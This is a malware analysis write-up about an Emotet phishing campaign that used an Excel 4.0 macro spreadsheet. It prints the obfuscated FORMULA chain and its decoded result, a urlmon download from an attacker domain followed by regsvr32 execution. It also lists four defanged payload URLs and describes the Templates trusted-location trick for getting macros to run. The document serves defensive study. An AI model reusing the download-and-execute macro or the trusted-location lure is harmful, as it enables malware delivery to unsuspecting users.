# Malicious XLS Document (Emotet)

I have spotted this maliciously looking email targeting our support people and it get me wondering what it is all about. After a detonation in AnyRun, it was apparent that it is Emotet malware, but I haven't seen this type of a Excel spreadsheet before.

```

Summary
In April 2022, Netskope Threat Labs analyzed an Emotet campaign that was using LNK files instead of Microsoft Office documents, likely as a response to the protections launched by Microsoft in 2022 to mitigate attacks via Excel 4.0 (XLM) and VBA macros.

However, we recently came across hundreds of malicious Office documents that are being used to download and execute Emotet, indicating that some attackers are still using old delivery methods in the wild. Despite the protection Microsoft released in 2022 to prevent the execution of Excel 4.0 (XLM) macros, this attack is still feasible against users who are using outdated versions of Office. It is also feasible against users who have changed the default setting to explicitly enable macros. The fact that attackers are still using Excel 4.0 Macros indicates that outdated Office versions and users who have this protection disabled are still common.

```

## Stage 01 - Email

The email itself is not very good phishing attempt, it screams problems all over it, but I guess they are going for quantity, not quality.

![Alt text](data/emotet_email.png?raw=true "Email sample")

## Stage 02 - Malicious XLS document

So what are we dealing with.

```
└─$ file RVP664343444ZG.xls
RVP664343444ZG.xls: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1251, Author: Gydar, Last Saved By: Gydar, Name of Creating Application: Microsoft Excel, Create Time/Date: Fri Jun  5 19:19:34 2015, Last Saved Time/Date: Mon Nov  7 19:53:23 2022, Security: 0
```

![Alt text](data/document_sample.png?raw=true "Document details")

Excel document uses the first line of all the sheets to show a fabricated message, that relaunch is required and the file needs to go to `Templates` folder. This is a way how to get the macro executed within the file without user consent, but I have never seen this technique before.

```
%PROGRAMFILES%\Microsoft Office\root\Templates and its subdirectories contain templates for Office applications that are available for all users on a computer.
This directory as well as its subdirectories is in the default list of MS Office: Trusted Locations for Excel, Word and PowerPoint.
```

This points out to conclusion that it uses Excel 4.0 macro. Let's verify it with `olevba`.

```
└─$ olevba RVP664343444ZG.xls
olevba 0.60.1 on Python 3.10.5 - http://decalage.info/python/oletools
===============================================================================
FILE: RVP664343444ZG.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Shee
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet
' 0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, visible - Sheet
' 0018     29 LABEL : Cell Value, String Constant - _xlfn.SINGLE hidden len=2 ptgErr  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x1d'
' 0018     58 LABEL : Cell Value, String Constant - built-in-name 1 Auto_Open len=7 ptgRef3d Sheet!G3
' 002a      2 PRINTHEADERS : Print Row/Column Labels
```

Let's dig little bit deeper and look for the auto open.

![Alt text](data/document_sample.png?raw=true "Document details")

`Auto_Open07457358934307593258350725798323209` points out to a hidden column. That holds  a formula, which reference hidden data all over the other sheets and it is used to put together. At this point we are getting to the classical Emotet stuff.

`=FORMULA(Sheet1!L24&Sheet1!L26&Sheet1!L27&Sheet1!L28&Sheet1!L28&Sheet2!F6&Sheet2!N19&Sheet1!F10&Sheet2!R3&Sheet5!Q21&Sheet2!F26&Sheet3!R13&Sheet5!E9&Sheet3!M26,G16)=FORMULA(Sheet1!L24&Sheet1!G8&Sheet1!F4&Sheet1!G8&Sheet1!L26&Sheet1!L30&Sheet1!F24&Sheet1!L26&Sheet3!F19&Sheet3!D5&Sheet1!A4&Sheet3!J14&Sheet1!A4&Sheet3!C32&Sheet1!F10&Sheet3!O23&Sheet3!P21&Sheet3!L8&Sheet5!E9&Sheet1!F24&Sheet1!L31,G18)=FORMULA(Sheet1!L24&Sheet1!L26&Sheet1!L27&Sheet1!L28&Sheet1!L28&Sheet2!F6&Sheet2!N19&Sheet1!F10&Sheet2!R3&Sheet5!Q21&Sheet2!G28&Sheet3!R13&Sheet5!G15&Sheet3!M26,G20)=FORMULA(Sheet1!L24&Sheet1!G8&Sheet1!F4&Sheet1!G8&Sheet1!L26&Sheet1!L30&Sheet1!F24&Sheet1!L26&Sheet3!F19&Sheet3!D5&Sheet1!A4&Sheet3!J14&Sheet1!A4&Sheet3!C32&Sheet1!F10&Sheet3!O23&Sheet3!P21&Sheet3!L8&Sheet5!G15&Sheet1!F24&Sheet1!L31,G22)=FORMULA(Sheet1!L24&Sheet1!L26&Sheet1!L27&Sheet1!L28&Sheet1!L28&Sheet2!F6&Sheet2!N19&Sheet1!F10&Sheet2!R3&Sheet5!Q21&Sheet2!I27&Sheet3!R13&Sheet5!J3&Sheet3!M26,G24)=FORMULA(Sheet1!L24&Sheet1!G8&Sheet1!F4&Sheet1!G8&Sheet1!L26&Sheet1!L30&Sheet1!F24&Sheet1!L26&Sheet3!F19&Sheet3!D5&Sheet1!A4&Sheet3!J14&Sheet1!A4&Sheet3!C32&Sheet1!F10&Sheet3!O23&Sheet3!P21&Sheet3!L8&Sheet5!J3&Sheet1!F24&Sheet1!L31,G26)=FORMULA(Sheet1!L24&Sheet1!L26&Sheet1!L27&Sheet1!L28&Sheet1!L28&Sheet2!F6&Sheet2!N19&Sheet1!F10&Sheet2!R3&Sheet5!Q21&Sheet2!J29&Sheet3!R13&Sheet5!L12&Sheet3!M26,G28)=FORMULA(Sheet1!L24&Sheet1!G8&Sheet1!F4&Sheet1!G8&Sheet1!L26&Sheet1!L30&Sheet1!F24&Sheet1!L26&Sheet3!F19&Sheet3!D5&Sheet1!A4&Sheet3!J14&Sheet1!A4&Sheet3!C32&Sheet1!F10&Sheet3!O23&Sheet3!P21&Sheet3!L8&Sheet5!L12&Sheet1!F24&Sheet1!L31,G30)=FORMULA(Sheet1!L24&Sheet1!G44&Sheet1!H46&Sheet1!J44,G36)`

Let's get the strings this function constructs.

```
"CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://cpcwiki[.]de/images/rirOpdztUEfG7WJ","..\oxnv1.ooccxx,0,0)"EXEC("C:\Windows\System32\regsvre /S ..\oxnv1.ooccxx:")"
```

Four different domains were used to download four different malicious ooccxx files.

Following four URLs were used for downloading malicious file
```
hxxps://cpcwiki[.]de/images/rirOpdztUEfG7WJ
hxxp://www.atashelement[.]ir/qds-seo-url-autofill/tmSetsq0wxsmXdA/
hxxp://a.angel-tn.idv[.]tw/web_images/aa7fEDOPvT2F1i/
hxxps://www.conceptagency[.]net/css/zXC/
```

## Requirements

- Cyberchef and regex enabled editor

## Questions

### Powershell code

Go to Cyberchef -> Base64 decode -> Decode text as ISO-8859

## Reading

https://blog.reversinglabs.com/blog/excel-4.0-macros

https://www.optimizationcore.com/security/extract-vba-macro-from-microsoft-word-excel-oledump/
https://www.optimizationcore.com/security/excelsheetunhide-reveal-unhide-hidden-excel-sheets/
https://github.com/denk-core/ExcelSheetUnhide
